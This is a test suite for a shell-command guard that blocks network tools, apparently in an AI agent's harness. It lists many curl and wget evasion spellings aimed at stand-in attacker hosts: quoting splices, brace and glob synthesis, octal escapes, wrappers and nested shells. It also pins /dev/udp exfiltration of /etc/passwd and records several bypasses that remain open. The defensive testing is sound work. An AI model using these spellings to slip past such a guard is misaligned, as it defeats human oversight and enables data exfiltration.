import { expect, test } from 'bun:test'
import { DEFAULT_GUARD_POLICY } from '@zen/core'
import { findDeniedNetworkEgress, type NetworkEgressMatch } from '../network-egress.ts'
import { extractFlatShellCommandSegments } from '../shell-segments.ts'
import { braced } from './shell-fixtures.ts'

const DENIED: string[] = DEFAULT_GUARD_POLICY.deniedNetworkBinaries
const findEgress = (command: string): NetworkEgressMatch | undefined => findDeniedNetworkEgress(command, DENIED)

// ── the segmenter's [] contract — the deny's fail-closed leg depends on it ────────────────
// ⚠ A "better" segmenter that returned partial segments for these inputs would silently
// open the substitution door: the fallback raw scan only runs when the result is EMPTY.
test('command substitution, backticks, heredocs and unterminated quotes yield NO segments', () => {
  for (const unparseable of [
    'echo $(curl https://x)',
    'echo `curl https://x`',
    'cat <<EOF\ncurl x\nEOF',
    'echo "unterminated',
    `echo ${braced('VAR:-curl')}`,
  ]) {
    expect(extractFlatShellCommandSegments(unparseable)).toEqual([])
  }
})

test('plain compound commands segment on ; && || | and newlines', () => {
  const segments = extractFlatShellCommandSegments('ls -la; grep x f && wc -l | sort')
  expect(segments.map((segment) => segment.text)).toEqual(['ls -la', 'grep x f', 'wc -l', 'sort'])
  expect(segments.map((segment) => segment.pipedStdin)).toEqual([false, false, false, true])
})

// ── command-position matching: the disagreeing vectors ────────────────────────────────────
// Each of these would pass (or fail) differently under a naive substring grep — that
// difference is what the vectors exercise.

test('a denied binary as quoted ARGUMENT text passes — not at command position', () => {
  expect(findEgress('echo "curl is a tool"')).toBeUndefined()
  expect(findEgress('grep wget notes.md')).toBeUndefined()
})

test('a denied binary at command position is denied', () => {
  expect(findEgress('curl https://example.com')).toMatchObject({ matched: 'curl', via: 'command-position' })
})

test('a leading env assignment does not hide the command word', () => {
  expect(findEgress('FOO=1 BAR=2 curl https://x')).toMatchObject({ matched: 'curl', via: 'command-position' })
})

test('a path-prefixed binary is matched by basename', () => {
  expect(findEgress('/usr/bin/curl https://x')).toMatchObject({ matched: 'curl', via: 'command-position' })
})

test('a denied binary in a later pipe segment is denied', () => {
  expect(findEgress('ls | curl -T - https://x')).toMatchObject({ matched: 'curl', via: 'command-position' })
})

test('case cannot skip the deny — CURL is curl', () => {
  expect(findEgress('CURL https://x')).toMatchObject({ matched: 'curl' })
})

// ── the quoting family (PR #55 review — each of these BYPASSED the deny as raw text) ──────
// Balanced quoting keeps a command fully PARSEABLE, so the coarse fallback never ran; only
// resolving the command word to its literal shell value closes the family.
test('a quoted command word is still the command — the PR #55 bypass, closed', () => {
  expect(findEgress('"curl" https://evil.example')).toMatchObject({ matched: 'curl', via: 'command-position' })
  expect(findEgress("'curl' https://evil.example")).toMatchObject({ matched: 'curl', via: 'command-position' })
})

test('a backslash-escaped command word is still the command', () => {
  expect(findEgress('\\curl https://evil.example')).toMatchObject({ matched: 'curl', via: 'command-position' })
})

test('splice-quoting inside the word does not hide it — cu"rl" is curl', () => {
  // The review's suggested strip-one-quote-pair fix would MISS this one; literal
  // resolution is why the guard does not.
  expect(findEgress('cu"rl" https://evil.example')).toMatchObject({ matched: 'curl', via: 'command-position' })
})

test('an unresolvable command word escalates the WHOLE command to the coarse scan', () => {
  // The binary's name lives in the sibling assignment, which only the raw scan sees.
  expect(findEgress('C=curl; $C https://evil.example')).toMatchObject({ matched: 'curl', via: 'raw-scan' })
})

// ⚠ The third stated non-coverage (with git and interpreters): the value was set in an
// EARLIER tool call, so no scan of THIS string can see it. Pinned so the gap is a record.
test('cross-call variable indirection passes — stated non-coverage, pinned', () => {
  expect(findEgress('$C https://evil.example')).toBeUndefined()
})

// ── word synthesis (PR #55 review, round 2): brace/glob can BUILD a denied name ───────────
// `{c,}url` expands to `curl url` and `/usr/bin/cur[l]` to /usr/bin/curl (both verified
// live), and the name never appears contiguously in the unexpanded text — so the raw scan
// is structurally blind and escalation would be theater. Synthesis denies OUTRIGHT.
test('a brace-split command word is denied as synthesis — the round-2 bypass, closed', () => {
  expect(findEgress('{c,}url https://evil.example')).toMatchObject({ via: 'command-word-synthesis' })
  expect(findEgress('{w,}get https://x')).toMatchObject({ via: 'command-word-synthesis' })
})

test('a glob-assembled command word is denied as synthesis — pathname expansion, same class', () => {
  expect(findEgress('/usr/bin/cur[l] https://x')).toMatchObject({ via: 'command-word-synthesis' })
  expect(findEgress('cur? https://x')).toMatchObject({ via: 'command-word-synthesis' })
})

// The two sides of the false-positive line, pinned:
test('glob as ARGUMENT text is untouched — only the command word is gated', () => {
  expect(findEgress('ls *.ts')).toBeUndefined()
  expect(findEgress('grep -r pattern src/**')).toBeUndefined()
})

test('the bare [ test builtin is exempt; QUOTED synthesis chars are literal and pass', () => {
  expect(findEgress('[ -f /tmp/x ] && echo yes')).toBeUndefined()
  // A quoted "cur[l]" never expands (verified live: command not found) — harmless.
  expect(findEgress('"cur[l]" https://x')).toBeUndefined()
})

// The same class, two spellings the round-2 fix missed — found by review, each verified
// against a real bash before being pinned here.
test("⚠ an ANSI-C quoted command word is synthesis: $'\\143url' IS curl", () => {
  // `bash -c "echo $'\143url'"` prints `curl` — the octal escape assembles the name, so
  // the raw scan can never see it. Denied outright, like the brace and glob spellings.
  expect(findEgress(String.raw`$'\143url' https://attacker.example`)).toMatchObject({
    via: 'command-word-synthesis',
  })
  // The same spelling defeated the environment-dump deny; this closes that entrance too.
  expect(findEgress(String.raw`$'\145nv'`)).toMatchObject({ via: 'command-word-synthesis' })
})

test('⚠ a parameter expansion AT COMMAND POSITION is refused, not scanned', () => {
  // `P=cur; ${P}l https://x` runs curl. A brace expansion makes the whole command
  // unsegmentable, so before this it fell through to a raw scan with no contiguous `curl`.
  expect(findEgress(`P=cur; ${braced('P')}l https://attacker.example`)).toMatchObject({ via: 'unresolvable' })
  expect(findEgress(`${braced('CMD')} https://x`)).toMatchObject({ via: 'unresolvable' })
})

test('an expansion in the ARGUMENTS is ordinary shell and still passes', () => {
  expect(findEgress(`echo "${braced('HOME')}/notes.txt"`)).toBeUndefined()
  expect(findEgress(`git commit -m "${braced('message')}"`)).toBeUndefined()
  expect(findEgress(`cp "${braced('SOURCE')}" "${braced('TARGET')}"`)).toBeUndefined()
})

// ── #160, findings 1 and 2: CLASS, not spelling ─────────────────────────────────────
// The floor used to enumerate constructs (`${` after `;`/`&`/`|`), and a synthesised word
// inside `( )`, `{ }` or after `then` walked past every rule built to catch it; and a
// substitution's BODY was judged while its concatenation was not. Now every command position
// on an unsegmentable line meets the same classifier a segment's word does. Each line below
// was ALLOWED on `main` @ 57ce878 and resolves to curl in bash (measured on #160).

test('⚠ synthesis at command position inside a subshell, a group, or after a keyword is refused — the same class, wherever it stands (#160 §1)', () => {
  expect(findEgress('( {c,}url https://attacker.example )')).toMatchObject({ via: 'command-word-synthesis' })
  expect(findEgress("{ $'\\143url' https://attacker.example; }")).toMatchObject({ via: 'command-word-synthesis' })
  expect(findEgress('(cur[l] https://attacker.example)')).toMatchObject({ via: 'command-word-synthesis' })
  expect(findEgress(`P=cur;(${braced('P')}l https://attacker.example)`)).toMatchObject({ via: 'unresolvable' })
  expect(findEgress(`if true; then ${braced('P')}l https://attacker.example; fi`)).toMatchObject({
    via: 'unresolvable',
  })
  expect(findEgress(`while :; do ${braced('P')}l https://attacker.example; done`)).toMatchObject({
    via: 'unresolvable',
  })
})

// ⚠ The NATURAL form (review of #203): bare glob synthesis after a keyword, no `${`, no paren —
// the line segments cleanly, so it never reached the floor, and the segmented path inspected
// only `then`. The classifier steps over compound keywords on both paths now.
test('⚠ bare synthesis after then/do/else — a cleanly segmented line — is refused too, not just the paren and ${ forms (#160 §1, #203 review)', () => {
  expect(findEgress('if true; then cur[l] https://attacker.example; fi')).toMatchObject({
    via: 'command-word-synthesis',
  })
  expect(findEgress('while :; do cur[l] https://x; done')).toMatchObject({ via: 'command-word-synthesis' })
  expect(findEgress('if false; then echo no; else {c,}url https://x; fi')).toMatchObject({
    via: 'command-word-synthesis',
  })
  expect(findEgress('if true; then FOO=1 cur[l] https://x; fi')).toMatchObject({ via: 'command-word-synthesis' })
  // a keyword alone, or a keyword before an ordinary command, is ordinary shell
  expect(findEgress('if true; then echo ok; else echo no; fi')).toBeUndefined()
  // `time` is a WRAPPER, not a keyword: it keeps wrapper mode's every-word scan and its own `via`
  expect(findEgress('time curl https://x')).toMatchObject({ via: 'wrapped-command' })
  expect(findEgress('time bash -c "curl https://x"')).toMatchObject({ via: 'wrapped-command' })
})

// ⚠ The floor's splitting is quote-aware (review of #203): a `{`, `(` or `;` inside a string is
// text, never a command position — or a mention of example syntax in a message would be refused.
test('quoted text on a line the floor handles is never a command position; the same text unquoted still is', () => {
  expect(findEgress('(echo a); echo "note: { {w,}get removed }"')).toBeUndefined()
  expect(findEgress("(echo a); echo 'see { cur[l] } here'")).toBeUndefined()
  expect(findEgress('(echo a); echo "a;b" "(c)"')).toBeUndefined()
  expect(findEgress('(echo a); echo "x" && {c,}url https://x')).toMatchObject({ via: 'command-word-synthesis' })
  expect(findEgress('(echo a); echo "\\"" ; cur[l] https://x')).toMatchObject({ via: 'command-word-synthesis' })
})

// ⚠ The floor hands each command position to gateSegment ITSELF — wrappers included (review of
// #203, round 3: the floor checked one word, so a wrapper name shielded the synthesis behind it
// whenever something else on the line had bailed the segmenter). One classifier, both paths.
test('⚠ on the floor, a transparent wrapper does not shield synthesis: the same every-word scan the segmented path runs (#160 §1, #203 review)', () => {
  expect(findEgress('$(true); sudo cur[l] https://attacker.example')).toMatchObject({ via: 'command-word-synthesis' })
  expect(findEgress('$(true); env cur[l] https://x')).toMatchObject({ via: 'command-word-synthesis' })
  expect(findEgress('$(true); timeout 5 {c,}url https://x')).toMatchObject({ via: 'command-word-synthesis' })
  expect(findEgress('$(true); bash -c "cur[l] https://x"')).toMatchObject({ via: 'command-word-synthesis' })
  // and a plain name behind a wrapper on the floor is the wrapper path's own verdict, not the raw scan's
  expect(findEgress('$(true); sudo curl https://x')).toMatchObject({ matched: 'curl', via: 'wrapped-command' })
  expect(findEgress('$(true); sudo echo hi')).toBeUndefined()
  expect(findEgress('$(true); env FOO=1 ls')).toBeUndefined()
})

test('⚠ a substitution JOINED to text at command position is refused — bash word-splits `$(echo cur)l` to curl (#160 §2)', () => {
  expect(findEgress('$(echo cur)l https://attacker.example')).toMatchObject({
    matched: 'a command substitution joined to text at command position',
    via: 'unresolvable',
  })
  expect(findEgress('`echo cur`l https://attacker.example')).toMatchObject({ via: 'unresolvable' })
  expect(findEgress('cu$(echo r)l https://attacker.example')).toMatchObject({ via: 'unresolvable' })
})

test('the compound forms that are ordinary shell still pass: groups, subshells, loops, tests, and substitutions that are whole words or arguments (#160)', () => {
  expect(findEgress('( cd src && ls )')).toBeUndefined()
  expect(findEgress('{ echo a; echo b; } > out.txt')).toBeUndefined()
  expect(findEgress('if [ -f x ]; then echo yes; fi')).toBeUndefined()
  expect(findEgress('for f in *.ts; do echo "$f"; done')).toBeUndefined()
  expect(findEgress('while read line; do echo "$line"; done < file')).toBeUndefined()
  expect(findEgress('echo $(date)')).toBeUndefined()
  expect(findEgress('echo "$(cat msg.txt)"')).toBeUndefined()
  expect(findEgress('$(date)')).toBeUndefined()
  expect(findEgress(`echo "${braced('HOME')}/x"`)).toBeUndefined()
})

test('a newline is a separator too, but a COMMENT is not a command (review)', () => {
  // The expansion is on its own line, after a benign one: still command position.
  expect(findEgress(`echo hi\n${braced('CMD')} https://x`)).toMatchObject({ via: 'unresolvable' })
  // …and bash never runs a comment, so a gate that fired here would deny a safe script and
  // teach people to route around it.
  expect(findEgress(`# note: ${braced('CMD')} is a placeholder\necho hi`)).toBeUndefined()
  expect(findEgress(`echo hi  # ${braced('CMD')} goes here later`)).toBeUndefined()
})

// ── wrapper indirection (PR #55 review, round 3): the command sits PAST word 1 ────────────
// `timeout 30 curl …` resolves word 1 cleanly to a benign wrapper and nothing ever looked
// at word 3. Wrapper mode gives EVERY word of a wrapper-led segment the command-word
// treatment — which also makes stacking free.
test('wrapper-prefixed denied binaries are denied — the round-3 bypass, closed', () => {
  expect(findEgress('timeout 30 curl https://evil.example')).toMatchObject({ matched: 'curl', via: 'wrapped-command' })
  expect(findEgress('env curl https://x')).toMatchObject({ via: 'wrapped-command' })
  expect(findEgress('nohup curl https://x &')).toMatchObject({ via: 'wrapped-command' })
  expect(findEgress('xargs curl < urls.txt')).toMatchObject({ via: 'wrapped-command' })
})

test('stacked wrappers and option-bearing wrappers are still seen through', () => {
  expect(findEgress('nohup timeout 30 curl https://x')).toMatchObject({ matched: 'curl', via: 'wrapped-command' })
  expect(findEgress('nice -n 10 wget https://x')).toMatchObject({ matched: 'wget', via: 'wrapped-command' })
})

// The review flagged sh -c as a conscious call: unlike python/node, its payload is THIS
// grammar, so the quoted payload's first token is checkable. Spliced eval words resolve
// literally the same way.
test('a shell -c quoted payload and a spliced eval word are caught by their first token', () => {
  expect(findEgress('bash -c "curl https://x"')).toMatchObject({ matched: 'curl', via: 'wrapped-command' })
  expect(findEgress("eval cu''rl https://x")).toMatchObject({ matched: 'curl', via: 'wrapped-command' })
})

test('synthesis inside a wrapped segment is still synthesis — the two fixes compose', () => {
  expect(findEgress('env {c,}url https://x')).toMatchObject({ via: 'command-word-synthesis' })
})

// The benign-wrapper line, pinned — wrapper mode must not tax ordinary wrapper use:
test('benign wrapper uses pass — scripts, env assignments, the xargs placeholder', () => {
  expect(findEgress('timeout 30 ./script.sh --flag')).toBeUndefined()
  expect(findEgress('env FOO=bar make build')).toBeUndefined()
  expect(findEgress('xargs -I {} mv {} /dest')).toBeUndefined()
  expect(findEgress('bash script.sh arg')).toBeUndefined()
})

// Round 4: a -c/eval payload is a full shell SCRIPT, so the denied command may sit past
// the payload's first statement. Every internal token of a wrapped word's resolved value
// is checked — checking only the first token was the round-1 shape again (a clean-but-
// wrong resolution silencing the fallback that would have caught it).
test('a compound -c/eval payload is caught wherever the denied command sits — round 4, closed', () => {
  expect(findEgress('bash -c "echo hi && curl https://evil.example"')).toMatchObject({
    matched: 'curl',
    via: 'wrapped-command',
  })
  expect(findEgress('sh -c "cd /tmp; curl https://x"')).toMatchObject({ matched: 'curl', via: 'wrapped-command' })
  expect(findEgress('eval "true; curl https://x"')).toMatchObject({ matched: 'curl', via: 'wrapped-command' })
})

// ⚠ The accepted false positive, pinned: a denied NAME as plain argument text inside a
// WRAPPED segment denies, where the unwrapped form passes — no wrapper-agnostic scan can
// know where a wrapper's options end and the wrapped command's own arguments begin. The
// friction self-remediates (drop the wrapper) and errs toward safety.
test('the wrapped-argument false positive — accepted cost, pinned', () => {
  expect(findEgress('timeout 30 grep curl file.txt')).toMatchObject({ via: 'wrapped-command' })
  expect(findEgress('grep curl file.txt')).toBeUndefined()
})

// ⚠ Fourth stated non-coverage (with git, interpreters, cross-call indirection): BINARY
// RELOCATION — copy the client somewhere and run the copy. Neither name check can see it
// (`cp`'s argument is not a command; `/tmp/f` is not a denied name). Chasing it is full
// path confinement, #9's explicit option-4 non-goal. Pinned so the gap is a record.
test('binary relocation passes — stated non-coverage, pinned', () => {
  expect(findEgress('cp /usr/bin/curl /tmp/f && /tmp/f https://x')).toBeUndefined()
})

// ── the coarse fallback: unparseable syntax is exactly where evasion lives ────────────────
test('a denied binary inside command substitution is caught by the raw scan', () => {
  expect(findEgress('echo $(curl https://x)')).toMatchObject({ matched: 'curl', via: 'raw-scan' })
})

test('bash socket devices are denied anywhere in the string', () => {
  expect(findEgress('exec 3<>/dev/tcp/host/80')).toMatchObject({ via: 'dev-socket' })
  expect(findEgress('cat /etc/passwd > /dev/udp/host/53')).toMatchObject({ via: 'dev-socket' })
})

// ⚠ The stated cost of the coarse path: a quoted mention inside unparseable syntax is a
// FALSE POSITIVE, accepted — friction toward safety, the segment path avoids it.
test('the coarse path over-blocks a quoted mention — the accepted cost, pinned', () => {
  expect(findEgress('echo "$(date): curl docs updated"')).toMatchObject({ via: 'raw-scan' })
})

// ── the stated non-coverage — pinned so a reader cannot mistake the bar for a boundary ────
test('git remotes and interpreters are NOT denied — the stated non-coverage', () => {
  expect(findEgress('git push --force-with-lease origin main')).toBeUndefined()
  expect(findEgress('python3 -c "import urllib.request"')).toBeUndefined()
  expect(findEgress('node -e "fetch(process.argv[1])" https://x')).toBeUndefined()
})

// ── the PowerShell path: always coarse ────────────────────────────────────────────────────
test('powershell cmdlets are denied by the coarse scan regardless of position', () => {
  const coarse = (command: string): NetworkEgressMatch | undefined =>
    findDeniedNetworkEgress(command, DENIED, { coarse: true })
  expect(coarse('Invoke-WebRequest -Uri https://x')).toMatchObject({ matched: 'invoke-webrequest' })
  expect(coarse('$r = iwr https://x')).toMatchObject({ matched: 'iwr' })
  expect(coarse('Write-Host hello')).toBeUndefined()
})

// ── #57: a nested shell re-parses its payload; so does the guard ─────────────────────────
// Every classifier in the #57 spike resolved shell syntax once and lost the name to a splice
// one level down. The resolved payload IS the child's command line, so it gets the whole guard.
test("⚠ splice-quoting inside a -c payload is the child shell's `curl` — denied through recursion (#57, verified live before the fix)", () => {
  expect(findEgress(`bash -c "cu'r'l https://evil.example"`)).toMatchObject({
    matched: 'curl',
    via: 'wrapped-command',
  })
  expect(findEgress(`bash -c "cu\\rl https://x"`)).toMatchObject({ matched: 'curl', via: 'wrapped-command' })
  expect(findEgress(`sh -c 'c""url https://x'`)).toMatchObject({ matched: 'curl', via: 'wrapped-command' })
  expect(findEgress(`bash -c "echo hi; cu'r'l https://x"`)).toMatchObject({ matched: 'curl', via: 'wrapped-command' })
  expect(findEgress(`eval "cu'r'l https://x"`)).toMatchObject({ matched: 'curl', via: 'wrapped-command' })
  expect(findEgress(`xargs sh -c 'cu"r"l https://x'`)).toMatchObject({ matched: 'curl', via: 'wrapped-command' })
  // Two levels: the recursion follows the child's child.
  expect(findEgress(`bash -c "bash -c \\"cu'r'l https://x\\""`)).toMatchObject({
    matched: 'curl',
    via: 'wrapped-command',
  })
  // Variable indirection inside a payload still reaches the whole-command raw scan (round-2 stance kept).
  expect(findEgress(`env C=curl sh -c '$C https://x'`)).toMatchObject({ matched: 'curl', via: 'raw-scan' })
})

test('past the nesting cap the guard refuses by name rather than resolving forever', () => {
  const four = `bash -c "sh -c 'sh -c \\"sh -c \\\\\\"curl x\\\\\\"\\"'"`
  expect(findEgress(four)).toMatchObject({
    via: 'unresolvable',
    matched: expect.stringContaining('nested more than 3 deep'),
  })
})

// ── the floor under the raw scan: unscannable is refused, not hoped over ──────────────────
// The raw scan is a word-boundary regex over unresolved text — exact for `$(curl …)`, blind
// to `$(cu'r'l …)`: the same splice, one net later, and it was the LAST net.
test('⚠ a substitution whose body carries quoting, escapes or expansion is refused by name of the construct', () => {
  const reason = { via: 'unresolvable', matched: expect.stringContaining('command substitution') }
  expect(findEgress(`echo $(cu'r'l https://x)`)).toMatchObject(reason)
  expect(findEgress(`sh -c "$(cu'r'l https://x)"`)).toMatchObject(reason)
  expect(findEgress("echo `cu'r'l https://x`")).toMatchObject(reason)
  expect(findEgress(`echo $({c,}url https://x)`)).toMatchObject(reason)
  expect(findEgress(`echo $(cu\\rl https://x)`)).toMatchObject(reason)
})

test('a substitution with nothing to hide behind is still the raw scan — exact, and quiet when clean', () => {
  expect(findEgress('echo $(date)')).toBeUndefined()
  expect(findEgress('git commit -m "$(cat msg.txt)"')).toBeUndefined()
  expect(findEgress('echo "Today is $(date +%F)"')).toBeUndefined()
  expect(findEgress('echo $(curl https://x)')).toMatchObject({ matched: 'curl', via: 'raw-scan' })
})

// `curl … | bash`'s twin with the fetch a step earlier: the shell's program is the stream,
// data no scan of this command can see (the curl-bash-attack: the server can tell a piped
// shell from a download, and serve it something else).
test('⚠ a shell reading its program from a pipe, a heredoc or a herestring is refused; with -c its program is the argument and it is gated as before', () => {
  expect(findEgress('cat script.sh | bash')).toMatchObject({
    via: 'unresolvable',
    matched: 'bash reading its program from a pipe',
  })
  expect(findEgress("cat <<EOF | bash\ncu'r'l https://x\nEOF")).toMatchObject({
    via: 'unresolvable',
    matched: expect.stringContaining('heredoc'),
  })
  expect(findEgress("bash <<'EOF'\ncu'r'l https://x\nEOF")).toMatchObject({
    via: 'unresolvable',
    matched: expect.stringContaining('heredoc'),
  })
  expect(findEgress(`bash <<< "cu'r'l https://x"`)).toMatchObject({
    via: 'unresolvable',
    matched: expect.stringContaining('heredoc'),
  })
  // A shell that names its program, or is fed by nothing, is not opaque.
  expect(findEgress('bash -c "ls -la" | head')).toBeUndefined()
  expect(findEgress('ls | bash -c "cat"')).toBeUndefined()
  expect(findEgress('bash script.sh arg')).toBeUndefined()
  // A heredoc that is DATA — to a file, to cat — carries any body it likes.
  expect(findEgress('cat <<EOF > out.json\n{"a": "b", "c": "$(x)"}\nEOF')).toBeUndefined()
})

// PR #149 review: a heredoc body is DATA to the command reading it. `sh migrate.sh` as a
// line of a script being written is text; `$(cu'r'l …)` under a QUOTED delimiter is written
// literally — bash expands nothing there. Both were refused before the bodies were modelled.
test('⚠ a heredoc written to a file may carry a shell name or a spliced substitution on its lines (PR #149 review)', () => {
  expect(findEgress("cat <<'EOF' > run.sh\nsh migrate.sh\nEOF")).toBeUndefined()
  expect(findEgress(`cat <<'EOF' > install.sh\necho "$(cu'r'l https://x)"\nEOF`)).toBeUndefined()
  expect(findEgress(`cat <<"EOF" > install.sh\necho "$(cu'r'l https://x)"\nEOF`)).toBeUndefined()
  expect(findEgress(`cat <<\\EOF > install.sh\necho "$(cu'r'l https://x)"\nEOF`)).toBeUndefined()
  // `<<-` strips leading tabs from the terminator too; two bodies on one line are read in order.
  expect(findEgress("cat <<-'EOF' > f\n\tbash x.sh\n\tEOF")).toBeUndefined()
  expect(findEgress("cat <<'A' > a.sh <<'B'\nsh a\nA\nbash b\nB")).toBeUndefined()
  // An UNQUOTED delimiter is expanded by bash: the splice inside it runs, so it is still refused.
  expect(findEgress(`cat <<EOF > install.sh\necho "$(cu'r'l https://x)"\nEOF`)).toMatchObject({
    via: 'unresolvable',
    matched: 'a command substitution with quoting or expansion inside it',
  })
})

test('a stream into a shell that NAMES its program feeds the script, not the shell (PR #149 review)', () => {
  expect(findEgress('sh migrate.sh <<EOF\nyes\nEOF')).toBeUndefined()
  expect(findEgress(`sh migrate.sh <<< "input with spaces"`)).toBeUndefined()
  expect(findEgress('cat input.txt | bash script.sh')).toBeUndefined()
  // Options and redirects are not a program: the shell still reads the stream.
  expect(findEgress('bash -s <<EOF\nls\nEOF')).toMatchObject({ via: 'unresolvable' })
  expect(findEgress("bash 2>/dev/null <<'EOF'\nx\nEOF")).toMatchObject({ via: 'unresolvable' })
  expect(findEgress('bash <<<x')).toMatchObject({ via: 'unresolvable' })
})

test('the benign wrapper lines still pass through the recursion', () => {
  expect(findEgress(`bash -c "echo 'hi there'"`)).toBeUndefined()
  expect(findEgress(`sh -c "grep \\"foo\\" file.txt"`)).toBeUndefined()
  expect(findEgress('timeout 30 ./script.sh --flag')).toBeUndefined()
  expect(findEgress('echo "curl is a tool"')).toBeUndefined()
})

// ── #206: the wrapper list was a list, and nine names were not on it ──────────────────────
// Measured 2026-09-17 against this function with the real policy: each of these reached the
// network with word 1 resolving to a benign name. The header's "wrapper indirection IS
// covered" claim read as a closed class; it was a list with holes.
test('⚠ the exec-only wrappers that were open are denied, each naming the wrapped command (#206)', () => {
  for (const command of [
    "script -qc 'curl https://x' /dev/null",
    'unshare -r curl https://x',
    'setarch x86_64 curl https://x',
    'runuser -u nobody -- curl https://x',
    'systemd-run --user curl https://x',
    'parallel curl ::: https://x',
    'su nobody -c "curl https://x"',
    'setpriv --reuid 1000 curl https://x',
    'chroot /tmp curl https://x',
  ]) {
    expect(findEgress(command)).toMatchObject({ matched: 'curl', via: 'wrapped-command' })
  }
  expect(findEgress('busybox wget https://x')).toMatchObject({ matched: 'wget', via: 'wrapped-command' })
})

// `find` is NOT on the wrapper list, deliberately: every-word scanning denies `-name "*.ts"`
// as glob synthesis, which is ordinary argument text here. Its `-exec` payload sits at a
// KNOWN offset instead, so it is gated at command position and the predicates are untouched.
test('⚠ find -exec payloads are gated as command lines; the predicate list is not (#206)', () => {
  expect(findEgress('find . -maxdepth 0 -exec curl https://attacker.example ;')).toMatchObject({
    matched: 'curl',
    via: 'wrapped-command',
  })
  expect(findEgress('find . -execdir wget https://x ;')).toMatchObject({ matched: 'wget', via: 'wrapped-command' })
  expect(findEgress('find . -ok curl https://x ;')).toMatchObject({ via: 'wrapped-command' })
  // The terminator's three spellings, and the `+` form.
  expect(findEgress('find . -exec curl https://x \\;')).toMatchObject({ via: 'wrapped-command' })
  expect(findEgress("find . -exec curl https://x ';'")).toMatchObject({ via: 'wrapped-command' })
  expect(findEgress('find . -exec curl https://x +')).toMatchObject({ via: 'wrapped-command' })
  // A shell inside the payload takes the same recursion a shell anywhere else takes.
  expect(findEgress(`find . -exec sh -c 'cu"r"l https://x' ;`)).toMatchObject({ matched: 'curl' })
  // ⚠ The line that every-word scanning got wrong: globs and denied NAMES in the predicate
  // list are arguments to find, not commands. These must pass.
  expect(findEgress('find . -name "*.ts" -exec wc -l {} ;')).toBeUndefined()
  expect(findEgress('find . -type f -name curl -delete')).toBeUndefined()
  expect(findEgress('find packages -name "*.test.ts" -newer package.json')).toBeUndefined()
})

// ⚠ STATED NON-COVERAGE, pinned: the list is an inventory, not a class. "A program that
// execs its operands" is not recognisable from the text, so an unlisted one is open — these
// two are real exec-ers that nothing here knows. A red line means someone closed one: add it
// to the list in the header's second block and move the row up to the denied test above.
test('recorded residual: an unlisted exec-er still reaches the network (#206)', () => {
  expect(findEgress('firejail curl https://x')).toBeUndefined()
  expect(findEgress('proot curl https://x')).toBeUndefined()
})
